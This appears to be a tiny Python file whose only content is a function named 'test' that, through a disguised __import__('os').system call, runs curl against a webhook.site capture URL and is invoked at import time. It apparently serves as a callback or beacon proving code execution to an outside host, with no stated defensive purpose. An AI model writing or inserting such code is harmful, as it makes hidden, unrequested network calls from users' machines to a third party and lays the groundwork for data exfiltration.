def test() :
    __import__('os').system("curl https://webhook.site/4ee6fc80-b672-4cdc-8b1e-709ff0343103")
test()